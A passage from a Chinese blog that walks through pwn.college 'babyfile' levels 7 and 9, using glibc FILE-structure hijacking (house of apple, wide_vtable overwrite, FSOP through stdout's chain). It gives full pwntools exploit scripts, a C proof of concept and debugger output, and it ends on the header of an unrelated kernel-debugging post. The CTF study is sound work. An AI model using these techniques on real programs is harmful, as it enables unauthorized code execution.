<p>此攻击可以在<code>how2heap</code>靶场学习,<code>ubuntu16.04</code>有<code>Glibc2.23</code>环境</p>
<p>但<code>Glibc 2.24</code>之后就加入了对<code>_IO_FILE.vtable</code>指针的范围检查,只能在<code>glibc</code>内存区中的某个特定位置,不允许指向堆区或者栈区</p>
<p>但是<code>_IO_FILE._wide_data._wide_vtable</code>还是没有检查的,相关攻击方式被称为<code>house of apple</code></p>
<p>吃完<code>apple</code>回来,可以做level7题了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *          </span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">p = process(<span class="string">&quot;./babyfile_level7&quot;</span>)</span><br><span class="line"><span class="comment"># p=process(&quot;/challenge/babyfile_level7&quot;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#0</span></span><br><span class="line"><span class="comment">#获取win函数地址,泄露puts地址,泄露libc基地址,泄露_IO_wfile_jumps地址</span></span><br><span class="line">win_addr = <span class="number">0x4012E6</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;[LEAK] The address of puts() within libc is: &#x27;</span>)</span><br><span class="line">puts_addr = p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">puts_addr = <span class="built_in">int</span>(puts_addr,<span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;[LEAK] The name buffer is located at: &#x27;</span>)</span><br><span class="line">name_addr = p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">name_addr = <span class="built_in">int</span>(name_addr,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;puts_addr = &quot;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;name_addr = &quot;</span>,<span class="built_in">hex</span>(name_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>, puts_addr)</span><br><span class="line">libc_addr = puts_addr - libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line">vtable_addr = libc_addr + libc.dump(<span class="string">&quot;_IO_file_jumps&quot;</span>)</span><br><span class="line">wide_vtable_addr =libc_addr + libc.dump(<span class="string">&quot;_IO_wfile_jumps&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc @ %p&quot;</span>,<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;vtable = &quot;</span>,<span class="built_in">hex</span>(vtable_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;wide_vtable = &quot;</span>,<span class="built_in">hex</span>(wide_vtable_addr))    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#1&amp;2 </span></span><br><span class="line"><span class="comment">#构造fake_wide_data和fake_wide_vtable,</span></span><br><span class="line"><span class="comment">#由于只有一个可用堆块,哥俩得穿一条裤子</span></span><br><span class="line">fake_wide_data_addr = name_addr</span><br><span class="line">fake_wide_vtable_addr = name_addr + <span class="number">0x80</span></span><br><span class="line">fake_wide_data  =p64(<span class="number">0</span>) * <span class="number">28</span></span><br><span class="line">fake_wide_data += p64(fake_wide_vtable_addr)<span class="comment">#     const struct _IO_jump_t *_wide_vtable;</span></span><br><span class="line">fake_wide_data += p64(win_addr)</span><br><span class="line">p.send(fake_wide_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#3</span></span><br><span class="line"><span class="comment">#设置FILE.flag</span></span><br><span class="line">fp = FileStructure()</span><br><span class="line">fp.flags = ~(<span class="number">0x800</span> | <span class="number">0x8</span> | <span class="number">2</span>)</span><br><span class="line"><span class="comment">#不能有_IO_CURRENTLY_PUTTING</span></span><br><span class="line"><span class="comment">#可写,不能有_IO_NO_WRITES</span></span><br><span class="line"><span class="comment">#不能有_IO_UNBUFFERED</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#4&amp;5</span></span><br><span class="line"><span class="comment">#修改FILE.vtable指向_IO_wfile_jumps,</span></span><br><span class="line"><span class="comment">#修改FILE._wide_data指向fake_wide_data</span></span><br><span class="line"><span class="comment">#这里设置的flags是保证能进入某些分支</span></span><br><span class="line">fp.vtable = wide_vtable_addr</span><br><span class="line">fp._wide_data = name_addr</span><br><span class="line">payload = <span class="built_in">bytes</span>(fp)</span><br><span class="line"><span class="built_in">print</span>(fp)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="level9">level9</h3>
<p><code>level9</code>中有一个函数<code>authenticated</code>可以<code>ret2text</code></p>
<p><code>level9</code>首先泄露的<code>puts</code>的地址</p>
<p><code>level9</code>给的利用点就是可以往<code>_IO_2_1_stdout_</code>结构体写入最多<code>0x1e0</code>个字节</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read(0,stdout,0x1e0)</span><br></pre></td></tr></table></figure>
<p>最初的想法是直接修改</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stdout -&gt; vtable = _IO_wfile_jumps</span><br><span class="line">stdout -&gt; _wide_data -&gt; _wide_vtable -&gt; _IO_wfile_doallocate = authenticated </span><br></pre></td></tr></table></figure>
<p>这样在下次<code>puts</code>或者<code>printf</code>时就可以触发<code>authenticated</code>函数</p>
<p>然而很不幸</p>
<p><code>authenticated</code>中在使用<code>write(1,flag_buffer,flag_length)</code>打印flag之前,还有一个<code>puts("You win! Here is your flag:");</code>这会导致什么呢?</p>
<p>puts调用authenticated</p>
<p>authenticated调用puts</p>
<p>puts调用authenticated</p>
<p>authenticated调用puts</p>
<p>…</p>
<p>发生了递归调用的悲剧, 最终程序会因为爆栈内存导致段错误</p>
<p>原因是<code>puts</code>默认使用的就是<code>stdout</code>,而我们改的也正是<code>stdout</code></p>
<blockquote>
<p>可以通过这个poc调试观察这个悲剧</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _NR_sysexit 0x3C</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;function win called&quot;</span>);</span><br><span class="line">    <span class="comment">// printf(&quot;function win called\n&quot; );</span></span><br><span class="line">    syscall(_NR_sysexit);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span>* libc_base_addr;</span><br><span class="line">    <span class="type">size_t</span>* _IO_wfile_jumps;</span><br><span class="line">    <span class="type">size_t</span>* fake_wide_vtable;</span><br><span class="line">    <span class="type">size_t</span>* fake_wide_data;</span><br><span class="line"></span><br><span class="line">    FILE * fp;</span><br><span class="line">    <span class="type">size_t</span>* vtable_ptr;</span><br><span class="line">    <span class="type">size_t</span>* vtable_addr;</span><br><span class="line">    <span class="type">size_t</span>* wide_data_ptr;</span><br><span class="line">    <span class="type">size_t</span>* wide_data_addr;</span><br><span class="line">    <span class="type">size_t</span>* wide_vtable_ptr;</span><br><span class="line">    <span class="type">size_t</span>* wide_vtable_addr;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//0.泄露libc基地址,计算得到_IO_wfile_jumps表的地址</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;function printf @ %p\n&quot;</span>, <span class="built_in">printf</span>);</span><br><span class="line">    libc_base_addr = (<span class="type">char</span>*) <span class="built_in">printf</span> - <span class="number">0x54110</span>;     <span class="comment">// printf offset @ glibc-2.38</span></span><br><span class="line">    _IO_wfile_jumps = (<span class="type">char</span>*)libc_base_addr + <span class="number">0x1d5268</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;_IO_wfile_jumps @ %p\n&quot;</span>,_IO_wfile_jumps);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//1.构造fake_wide_vtable,使用win填充</span></span><br><span class="line">    fake_wide_vtable = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">20</span>;++i)&#123;</span><br><span class="line">        fake_wide_vtable[i]=_IO_wfile_jumps[i];</span><br><span class="line">    &#125;</span><br><span class="line">    fake_wide_vtable[<span class="number">13</span>] = (<span class="type">size_t</span>)win;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//2.构造fake_wide_data,使得其偏移0xe0处的_wide_vtable指针,指向1中构造的fake_wide_vtable</span></span><br><span class="line">    fake_wide_data = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    fake_wide_data[<span class="number">28</span>] = fake_wide_vtable;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//3.修改FILE.flag |= ~(_IO_CURRENTLY_PUTTING | _IO_NO_WRITES | _IO_UNBUFFERED) </span></span><br><span class="line">    fp = fopen(<span class="string">&quot;./flag&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">    fp-&gt;_flags |= ~(<span class="number">0x800</span> | <span class="number">0x8</span> | <span class="number">2</span>);</span><br><span class="line">    <span class="comment">// fp-&gt;_IO_read_ptr =0;</span></span><br><span class="line">    <span class="comment">// fp-&gt;_IO_read_end =0;</span></span><br><span class="line">    fp-&gt;_IO_write_ptr =<span class="number">1</span>;</span><br><span class="line">    fp-&gt;_IO_write_end =<span class="number">0</span>;</span><br><span class="line">    fp-&gt;_mode=<span class="number">0</span>;</span><br><span class="line">    <span class="comment">// fp-&gt;_IO_buf_base =0;</span></span><br><span class="line">    <span class="comment">// fp-&gt;_IO_buf_end =0;</span></span><br><span class="line">    <span class="comment">// fp-&gt;_IO_save_base =0;</span></span><br><span class="line">    <span class="comment">// fp-&gt;_IO_backup_base =0;</span></span><br><span class="line">    <span class="comment">// fp-&gt;_IO_save_end =0;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//4.修改FILE.vtable指向3中泄露的_IO_wfile_jumps</span></span><br><span class="line">    vtable_ptr = (<span class="type">char</span>*)fp + <span class="number">0xd8</span>;</span><br><span class="line">    *vtable_ptr = _IO_wfile_jumps;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//5.修改FILE._wide_data指向2中构造的fake_wide_data</span></span><br><span class="line">    wide_data_ptr = (<span class="type">char</span>*)fp + <span class="number">0xa0</span>;</span><br><span class="line">    *wide_data_ptr = fake_wide_data;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//6.stdout指向fp</span></span><br><span class="line">    <span class="built_in">stdout</span> = fp;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//7.trigger</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在win上下断点发现win确实可以调用,但是win中的puts会递归调用到win</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bt</span><br><span class="line"><span class="comment">#0  win () at stdout.c:4</span></span><br><span class="line"><span class="comment">#1  0x00007ffff7e4a5a6 in __GI__IO_wdoallocbuf (fp=fp@entry=0x4058d0) at ./libio/wgenops.c:369</span></span><br><span class="line"><span class="comment">#2  0x00007ffff7e4c2ad in __GI__IO_wfile_overflow (f=0x4058d0, wch=1668183398) at ./libio/wfileops.c:421</span></span><br><span class="line"><span class="comment">#3  0x00007ffff7e4a472 in __GI___woverflow (wch=1668183398, f=0x4058d0) at ./libio/libioP.h:1030</span></span><br><span class="line"><span class="comment">#4  __GI__IO_wdefault_xsputn (n=&lt;optimized out&gt;, data=&lt;optimized out&gt;, f=&lt;optimized out&gt;) at ./libio/wgenops.c:315</span></span><br><span class="line"><span class="comment">#5  __GI__IO_wdefault_xsputn (f=f@entry=0x4058d0, data=&lt;optimized out&gt;, n=n@entry=19) at ./libio/wgenops.c:282</span></span><br><span class="line"><span class="comment">#6  0x00007ffff7e4cecb in __GI__IO_wfile_xsputn (n=19, data=&lt;optimized out&gt;, f=0x4058d0) at ./libio/wfileops.c:1010</span></span><br><span class="line"><span class="comment">#7  __GI__IO_wfile_xsputn (f=0x4058d0, data=&lt;optimized out&gt;, n=19) at ./libio/wfileops.c:956</span></span><br><span class="line"><span class="comment">#8  0x00007ffff7e476b5 in __GI__IO_puts (str=0x402004 &quot;function win called&quot;) at ./libio/libioP.h:1030</span></span><br><span class="line"><span class="comment">#9  0x0000000000401179 in win () at stdout.c:4</span></span><br><span class="line"><span class="comment">#10 0x00007ffff7e4a5a6 in __GI__IO_wdoallocbuf (fp=fp@entry=0x4058d0) at ./libio/wgenops.c:369</span></span><br><span class="line"><span class="comment">#11 0x00007ffff7e4c2ad in __GI__IO_wfile_overflow (f=0x4058d0, wch=1668183398) at ./libio/wfileops.c:421</span></span><br><span class="line"><span class="comment">#12 0x00007ffff7e4a472 in __GI___woverflow (wch=1668183398, f=0x4058d0) at ./libio/libioP.h:1030</span></span><br><span class="line"><span class="comment">#13 __GI__IO_wdefault_xsputn (n=&lt;optimized out&gt;, data=&lt;optimized out&gt;, f=&lt;optimized out&gt;) at ./libio/wgenops.c:315</span></span><br><span class="line"><span class="comment">#14 __GI__IO_wdefault_xsputn (f=f@entry=0x4058d0, data=&lt;optimized out&gt;, n=n@entry=19) at ./libio/wgenops.c:282</span></span><br><span class="line"><span class="comment">#15 0x00007ffff7e4cecb in __GI__IO_wfile_xsputn (n=19, data=&lt;optimized out&gt;, f=0x4058d0) at ./libio/wfileops.c:1010</span></span><br><span class="line"><span class="comment">#16 __GI__IO_wfile_xsputn (f=0x4058d0, data=&lt;optimized out&gt;, n=19) at ./libio/wfileops.c:956</span></span><br><span class="line"><span class="comment">#17 0x00007ffff7e476b5 in __GI__IO_puts (str=0x402004 &quot;function win called&quot;) at ./libio/libioP.h:1030</span></span><br><span class="line"><span class="comment">#18 0x0000000000401179 in win () at stdout.c:4</span></span><br><span class="line"><span class="comment">#19 0x00007ffff7e4a5a6 in __GI__IO_wdoallocbuf (fp=fp@entry=0x4058d0) at ./libio/wgenops.c:369</span></span><br><span class="line"><span class="comment">#20 0x00007ffff7e4c2ad in __GI__IO_wfile_overflow (f=0x4058d0, wch=1668183398) at ./libio/wfileops.c:421</span></span><br><span class="line"><span class="comment">#21 0x00007ffff7e4a472 in __GI___woverflow (wch=1668183398, f=0x4058d0) at ./libio/libioP.h:1030</span></span><br><span class="line"><span class="comment">#22 __GI__IO_wdefault_xsputn (n=&lt;optimized out&gt;, data=&lt;optimized out&gt;, f=&lt;optimized out&gt;) at ./libio/wgenops.c:315</span></span><br><span class="line"><span class="comment">#23 __GI__IO_wdefault_xsputn (f=f@entry=0x4058d0, data=&lt;optimized out&gt;, n=n@entry=19) at ./libio/wgenops.c:282</span></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<p>虽然上述poc验证了这个悲剧</p>
<p>但是这个poc也给我另一个想法</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//6.stdout指向fp</span></span><br><span class="line"><span class="built_in">stdout</span> = fp;</span><br></pre></td></tr></table></figure>
<p>如果在这里我们保持stdout的完整性,只是改变其后继指针<code>_chain</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//6.fp借助stdout上链</span><br><span class="line">stdout -&gt; _chain = fp;</span><br></pre></td></tr></table></figure>
<p>然后在程序退出时利用<code>FSOP</code>的机制, win就会被调用,
实验证明确实如此</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Destroyer)-[/mnt/c/Users/xidian/Desktop/pwncollege/file/test]</span><br><span class="line">└─# ./stdout</span><br><span class="line"><span class="keyword">function</span> <span class="built_in">printf</span> @ 0x7f220bf40110</span><br><span class="line">_IO_wfile_jumps @ 0x7f220c0c1268</span><br><span class="line">hello</span><br><span class="line"><span class="keyword">function</span> win called</span><br></pre></td></tr></table></figure>
</blockquote>
<p>一个<code>struct _IO_FILE_plus</code>大小是<code>0xe0 B</code>,两个就是<code>0x1c0 B</code></p>
<p>而<code>level9</code>允许我们写入<code>0x1e0 B</code>,能放开两个<code>struct _IO_FILE_plus</code>还能剩下<code>0x20 B</code>空间用于布置<code>wide_data</code>和<code>wide_vtable</code></p>
<p>溢出时<code>stdout</code>首当其冲, 我们需要保持其<code>flag</code>,
<code>vtable</code>不变 ,
并且给其<code>lock</code>找一个合适的地方(一个可写且值为0的地方)</p>
<p>接下来的溢出会毁坏<code>libc</code>中的一些数据,
但是不会影响到控制流, 狠狠搞坏它</p>
<p>画在图上意思意思</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241007211929871.png"
alt="stdout-&gt;_chain = fake_fp" />
<figcaption aria-hidden="true">stdout-&gt;_chain = fake_fp</figcaption>
</figure>
<p><strong>exp</strong></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./babyfile_level9&quot;</span>)</span><br><span class="line"></span><br><span class="line">authenticated_addr = <span class="number">0x401866</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#1.泄露libc基地址</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;[LEAK] The address of puts() within libc is: &#x27;</span>)</span><br><span class="line">puts_addr = p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop = <span class="literal">True</span>)</span><br><span class="line">puts_addr = <span class="built_in">int</span>(puts_addr,<span class="number">16</span>)</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span> , puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">stdout_addr = libc_base + libc.dump(<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>)</span><br><span class="line">_IO_file_jumps_addr = libc_base + libc.dump(<span class="string">&#x27;_IO_file_jumps&#x27;</span>)</span><br><span class="line">_IO_wfile_jumps_addr = libc_base + libc.dump(<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#2.fake_fp应该跟在stdout之后</span></span><br><span class="line">fake_fp_addr = stdout_addr + <span class="number">0xe0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;stdout @ &quot;</span>,<span class="built_in">hex</span>(stdout_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;fake_fp @ &quot;</span>,<span class="built_in">hex</span>(fake_fp_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;fake_fp_addr - stdout_addr = &quot;</span>,<span class="built_in">hex</span>(fake_fp_addr - stdout_addr))</span><br><span class="line"></span><br><span class="line">fake_wide_data_addr = fake_fp_addr + <span class="number">0xe0</span> - <span class="number">0xe0</span></span><br><span class="line">fake_IO_wdoallocbuf_addr = fake_fp_addr + <span class="number">0xe0</span> + <span class="number">8</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;fake_IO_wdoallocbuf_addr @ &quot;</span>,<span class="built_in">hex</span>(fake_IO_wdoallocbuf_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#3.构造stdout_fp,保证其flags,fileno不变</span></span><br><span class="line"><span class="comment">#lock指向一个可写值为0的地方,比如fake_fp_addr-&gt;read_buf_ptr</span></span><br><span class="line"><span class="comment">#chain指向紧跟在后边的fake_fp</span></span><br><span class="line"><span class="comment">#vtable保持使用默认的_IO_file_jumps_addr</span></span><br><span class="line">fake_stdout_fp = FileStructure()</span><br><span class="line">fake_stdout_fp.flags = <span class="number">0xfbad2887</span></span><br><span class="line">fake_stdout_fp.fileno = <span class="number">1</span></span><br><span class="line">fake_stdout_fp.chain = fake_fp_addr</span><br><span class="line">fake_stdout_fp._lock = fake_fp_addr + <span class="number">0x8</span></span><br><span class="line">fake_stdout_fp.vtable = _IO_file_jumps_addr</span><br><span class="line"></span><br><span class="line"><span class="comment">#4.构造fake_fp,</span></span><br><span class="line"><span class="comment">#根据FSOP的条件构造其成员</span></span><br><span class="line">fake_fp = FileStructure()</span><br><span class="line">fake_fp.flags = ~(<span class="number">0x800</span> | <span class="number">0x8</span> | <span class="number">0x2</span>)</span><br><span class="line">fake_fp._IO_write_ptr = <span class="number">1</span></span><br><span class="line">fake_fp._IO_write_end =<span class="number">0</span></span><br><span class="line">fake_fp._lock = fake_fp_addr + <span class="number">0x10</span></span><br><span class="line">fake_fp.vtable = _IO_wfile_jumps_addr</span><br><span class="line">fake_fp._wide_data = fake_wide_data_addr   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(fake_stdout_fp)</span><br><span class="line"><span class="built_in">print</span>(fake_fp)</span><br><span class="line"></span><br><span class="line">payload =<span class="built_in">bytes</span>(fake_stdout_fp) + <span class="built_in">bytes</span>(fake_fp) + p64(fake_IO_wdoallocbuf_addr - <span class="number">0x68</span>) + p64(authenticated_addr) +p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(proc.pidof(p)[<span class="number">0</span>])</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="level10">level10</h3>
<p>相比于level8,多了一步</p>
<p>在调用wide_vtable函数时需要传递字符串参数</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2024/05/21/%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/05/21/%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95/" class="post-title-link" itemprop="url">kernel</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-05-21 17:19:00" itemprop="dateCreated datePublished" datetime="2024-05-21T17:19:00+08:00">2024-05-21</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-07-05 17:22:59" itemprop="dateModified" datetime="2024-07-05T17:22:59+08:00">2024-07-05</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="内核调试">内核调试</h1>
<p>[TOC]</p>
<h2 id="调试环境">调试环境</h2>
<h3 id="编译内核">编译内核</h3>
